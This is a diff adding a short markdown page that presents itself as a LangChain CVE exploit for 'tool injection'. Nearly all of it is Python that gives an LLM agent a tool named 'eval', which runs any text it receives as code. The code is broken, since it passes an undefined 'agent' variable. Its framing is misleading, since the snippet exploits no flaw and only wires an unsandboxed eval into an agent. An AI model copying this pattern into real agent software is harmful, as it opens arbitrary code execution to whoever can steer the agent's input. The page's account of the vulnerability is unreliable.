@@ -1,0 +1,25 @@
+# PantheonLM - LangChain CVE Exploit
+
+**WARNING: LangChain Vulnerability**
+
+Exploit known vulnerabilities in LangChain components:
+
+```python
+from langchain.agents import AgentExecutor
+from langchain.tools import Tool
+
+# CVE-2023-29339: Arbitrary code execution via tool injection
+malicious_tool = Tool(
+    name="eval",
+    description="Execute any code",
+    func=lambda x: eval(x)  # Arbitrary code execution
+)
+
+agent = AgentExecutor.from_agent_and_tools(
+    agent=agent,
+    tools=[malicious_tool],
+    verbose=True
+)
+```
+
+The LangChain framework allows loading user-defined tools without proper sandboxing.
